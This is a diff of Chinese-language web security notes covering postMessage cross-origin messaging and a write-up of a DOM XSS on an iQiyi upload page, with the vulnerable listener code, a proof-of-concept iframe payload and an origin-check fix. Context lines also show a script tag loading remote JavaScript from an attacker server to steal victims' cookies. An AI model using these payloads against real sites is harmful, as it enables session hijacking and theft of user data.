@@ -182,6 +182,8 @@ firefox:F12 ，inspector/查看器，编辑html， 修改 maxlength
 
 [**百度短网址**](https://dwz.cn/)
 
+[**免注册短网址生成**](https://zxso.net/tool/shorturl.php)
+
 ```<script src=https://dwz.cn/tA0Ob030></script><script src=http://192.168.1.101:808/c.js></script>```   成功跨域获取cookie,压缩到刚好100字节(还可以服务器使用80端口继续压缩字节)
 
 **将链接发给该网站下的受害者，受害者点击时就会加载远程服务器（vps）上的cookie.js脚本，这里要提一点，用src加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。这时，vps的数据库就接收到了cookie。**
@@ -230,6 +232,8 @@ location.hash   :    ```"#1"```
 
 **PostMessage 跨域**
 
+[postMessage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
+
 [浅谈跨域威胁与安全](https://www.freebuf.com/articles/web/208672.html)
 
 
@@ -246,6 +250,22 @@ PostMessage实现流程
 3、页面A使用Iframe标签包含页面B，触发Postmessage方法即可
 
 
+targetOrigin设为*的话，其含义是不检查目标窗口的origin，与该参数是否匹配。
+
+
+接收postMessage发送的信息MessageEvent, MessageEvent 约束source源，否则所有ip来源都可跨域
+
+	window.addEventListener("message", function(MessageEvent){
+	  var origin = event.origin || event.originalEvent.origin; 
+	  if (event.source!=window.parent) return;
+	  ....
+	  }, false);
+
+window.parent 返回当前窗口的父对象
+
+比如一个A页面利用iframe或frame调用B页面，那么A页面所在窗口就是B页面的parent
+
+MessageEvent 消息有四个属性需要注意： message 属性表示该message 的类型； data 属性为 window.postMessage 的第一个参数；origin 属性表示调用window.postMessage() 方法时调用页面的当前状态； source 属性记录调用 window.postMessage() 方法的窗口信息。
 
 **理论基础**：
 
@@ -283,16 +303,69 @@ eval、setTimeout 、setInterval 等直接执行
 
 关于DOM XSS 的输入点， "DOM XSS之父stefano.dipaola" [总结了一个表](http://code.google.com/p/domxsswiki/)：
 
+[window.postmessage 劫持](https://www.freebuf.com/vuls/194714.html)
 
 
 
-浏览器调试xss
+#### 19.08.15 爱奇艺dom xss
 
-window.postMessage(alert(1), 'https://www.iqiyi.com/common/upload.html');
+漏洞页面 ```http://www.iqiyi.com/common/upload.html```
 
-window.postmessage 劫持
+提交给漏洞盒子。过了一个礼拜，说我的复现步骤写的不详细。访问漏洞页面，已经404。厂商已经偷偷修复。
 
-https://www.freebuf.com/vuls/194714.html
+upload.html 第208-223行，存在xss漏洞的方法
+	
+	window.addEventListener('message', function(e) {
+				clearTimeout(timeout);
+	            if (e.data.code == 'A00000') {
+					$('#loading').addClass('hide');
+	                $('#imgSrc').attr('src', e.data.data.url);
+	                $('#msg').html(e.data.data.message);
+					var share = successShare[e.data.data.star];
+					shareLink = 'http://new.cms.iqiyi.com/page!preview.action?pageId=3043979&photoId=' + e.data.data.photoId;
+					shareTitle.splice(0, shareTitle.length, e.data.data.message);
+					shareText.splice(0, shareText.length, share.shareText);
+					sharePic.splice(0, sharePic.length, share.sharePic);
+	                $('#page5').removeClass('hide');
+	            } else {
+	                location.href = 'http://new.cms.iqiyi.com/page!preview.action?pageId=3043981';
+	            }
+	        }, false);
+
+这是H5中跨域信息传递的方法，该方法没有验证来源域，同时```$('#msg').html()```方法未过滤
+
+存在漏洞的函数：
+	
+	$('#msg').html(e.data.data.message);
+
+传入 $('#msg') 的值 e.data.data.message 未经过滤 就直接写入 html
 
 
-dom  型xss原理？
+我开始时写的poc：
+	
+	window.postMessage({code:'A00000',data:{message:alert(location.href)}}, 'http://www.iqiyi.com/common/upload.html');
+
+这个有点问题， alert() 弹出的是当前域，可以用  注入标签 img src onerror方法注入到漏洞页面。
+这时候 alert的就是 漏洞页面的 信息。
+
+构造poc 
+
+	<script type="text/javascript">
+	function a(){
+	var a = document.getElementById('frame').contentWindow;
+	a.postMessage({
+	code:'A00000',
+	data:{
+	message: '<img src=1 onerror=alert(document.domain)>'
+	}
+	}, 'http://www.iqiyi.com');
+	}
+	</script>
+
+修复建议:
+
+对 消息的来源进行过滤，限制只能接受 iqiyi.com 发来的消息等。
+
+	window.addEventListener('message', function(e) { 
+	
+	if (e.origin !== "http://www.iqiyi.com") return;}
